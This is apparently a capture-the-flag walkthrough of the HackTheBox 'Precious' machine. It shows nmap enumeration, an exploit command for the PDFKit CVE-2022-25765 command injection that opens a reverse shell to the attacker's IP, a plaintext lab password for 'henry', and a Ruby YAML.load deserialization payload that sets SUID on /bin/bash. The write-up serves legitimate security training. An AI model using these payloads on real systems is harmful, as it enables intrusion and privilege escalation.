---
icon: ubuntu
---

# Precious - Easy

<figure><img src="../../.gitbook/assets/image.png" alt="" width="75"><figcaption><p><a href="https://www.hackthebox.com/machines/precious"><strong>Precious</strong></a></p></figcaption></figure>

## <mark style="color:$success;">Scanning & Enumeration</mark>

{% code title="Nmap TCP Scan" overflow="wrap" expandable="true" %}
```shellscript
nmap -A -T4 -p- -Pn 10.129.228.98 -oN scans/nmap-tcpall
Starting Nmap 7.98 ( https://nmap.org ) at 2026-03-20 09:42 -0400
Nmap scan report for 10.129.228.98
Host is up (0.035s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey: 
|   3072 84:5e:13:a8:e3:1e:20:66:1d:23:55:50:f6:30:47:d2 (RSA)
|   256 a2:ef:7b:96:65:ce:41:61:c4:67:ee:4e:96:c7:c8:92 (ECDSA)
|_  256 33:05:3d:cd:7a:b7:98:45:82:39:e7:ae:3c:91:a6:58 (ED25519)
80/tcp open  http    nginx 1.18.0
|_http-title: Did not follow redirect to http://precious.htb/
|_http-server-header: nginx/1.18.0
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.19
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 5900/tcp)
HOP RTT      ADDRESS
1   91.03 ms 10.10.16.1
2   25.94 ms 10.129.228.98
```
{% endcode %}

I'll add the domain discoverd by nmap to my hosts file

{% code title="/etc/hosts" overflow="wrap" expandable="true" %}
```shellscript
10.129.228.98	precious.htb
```
{% endcode %}

### <mark style="color:blue;">HTTP Port 80 TCP</mark>

#### <mark style="color:$primary;">Tech Detection</mark>

{% code overflow="wrap" expandable="true" %}
```shellscript
curl -I http://precious.htb/
HTTP/1.1 200 OK
Content-Type: text/html;charset=utf-8
Content-Length: 483
Connection: keep-alive
Status: 200 OK
X-XSS-Protection: 1; mode=block
X-Content-Type-Options: nosniff
X-Frame-Options: SAMEORIGIN
Date: Fri, 20 Mar 2026 13:49:04 GMT
X-Powered-By: Phusion Passenger(R) 6.0.15
Server: nginx/1.18.0 + Phusion Passenger(R) 6.0.15
X-Runtime: Ruby
```
{% endcode %}

We have an nginx server, with a web app served by <mark style="color:yellow;">**Phusion Passenger(R) 6.0.15**</mark> running Ruby

I tried searching for an exploit for Phusion Passenger(R) 6.0.15 but nothing came up

#### <mark style="color:$primary;">Website</mark>

<figure><img src="../../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>

I am going to create an empty html file and serve it to the site.

<figure><img src="../../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>

Let's check the pdf file we got back

<figure><img src="../../.gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>

We got a version of the underlying technology doing the conversion

A quick googl search reveals an POC Exploit on Github&#x20;

<figure><img src="../../.gitbook/assets/image (5).png" alt=""><figcaption></figcaption></figure>

### <mark style="color:blue;">PDFkit-CMD-Injection <= 0.8.6 - (CVE-2022-25765)</mark>

{% embed url="https://github.com/nikn0laty/PDFkit-CMD-Injection-CVE-2022-25765" %}

{% code overflow="wrap" expandable="true" %}
```shellscript
python CVE-2022-25765.py -t http://precious.htb/ -a 10.10.16.63 -p 443
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (6).png" alt=""><figcaption></figcaption></figure>

## <mark style="color:$success;">Post Exploitation</mark>

### <mark style="color:blue;">Shell as ruby</mark>

### <mark style="color:$primary;">Manual Enumeration -> Hardcoded Creds</mark>

<figure><img src="../../.gitbook/assets/image (8).png" alt=""><figcaption></figcaption></figure>

Doing some manual Enumeration I discovered that ruby had its own home directory. I saw an interesting .bundle folder with a config file inside. That config file contained henry's creds!

{% code overflow="wrap" expandable="true" %}
```shellscript
henry:Q3c1AqGHtoI0aXAYFH
```
{% endcode %}

### <mark style="color:blue;">Shell as henry</mark>

<figure><img src="../../.gitbook/assets/image (9).png" alt=""><figcaption></figcaption></figure>

### <mark style="color:blue;">Universal RCE with Ruby YAML.load</mark>

<figure><img src="../../.gitbook/assets/image (10).png" alt=""><figcaption></figcaption></figure>

henry can run ruby on a script as the root user. Let's check out the script

{% code title="/opt/update_dependencies.rb" overflow="wrap" expandable="true" %}
```ruby
# Compare installed dependencies with those specified in "dependencies.yml"
require "yaml"
require 'rubygems'

# TODO: update versions automatically
def update_gems()
end

def list_from_file
    YAML.load(File.read("dependencies.yml"))
end

def list_local_gems
    Gem::Specification.sort_by{ |g| [g.name.downcase, g.version] }.map{|g| [g.name, g.version.to_s]}
end

gems_file = list_from_file
gems_local = list_local_gems

gems_file.each do |file_name, file_version|
    gems_local.each do |local_name, local_version|
        if(file_name == local_name)
            if(file_version != local_version)
                puts "Installed version differs from the one specified in file: " + local_name
            else
                puts "Installed version is equals to the one specified in file: " + local_name
            end
        end
    end
end
```
{% endcode %}

The script is trying to load a .yml file

<figure><img src="../../.gitbook/assets/image (11).png" alt=""><figcaption></figcaption></figure>

However the .yml file i missing fom the `/opt` directory

<figure><img src="../../.gitbook/assets/image (12).png" alt=""><figcaption></figcaption></figure>

When trying to run it without the .yml file it is complaining that its missing.

Google for an exploit I came Acrosss this post

{% embed url="https://staaldraad.github.io/post/2021-01-09-universal-rce-ruby-yaml-load-updated/" %}

I am going to use this script and modify it so that it adds the SUID to /bin/bash for easy privesc

{% code title="dependencies.yml" overflow="wrap" expandable="true" %}
```yaml
---
- !ruby/object:Gem::Installer
    i: x
- !ruby/object:Gem::SpecFetcher
    i: y
- !ruby/object:Gem::Requirement
  requirements:
    !ruby/object:Gem::Package::TarReader
    io: &1 !ruby/object:Net::BufferedIO
      io: &1 !ruby/object:Gem::Package::TarReader::Entry
         read: 0
         header: "abc"
      debug_output: &1 !ruby/object:Net::WriteAdapter
         socket: &1 !ruby/object:Gem::RequestSet
             sets: !ruby/object:Net::WriteAdapter
                 socket: !ruby/module 'Kernel'
                 method_id: :system
             git_set: "chmod +s /bin/bash"
         method_id: :resolve

```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (13).png" alt=""><figcaption></figcaption></figure>

Save the script to a file,then run&#x20;

{% code overflow="wrap" expandable="true" %}
```shellscript
sudo /usr/bin/ruby /opt/update_dependencies.rb
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (14).png" alt=""><figcaption></figcaption></figure>
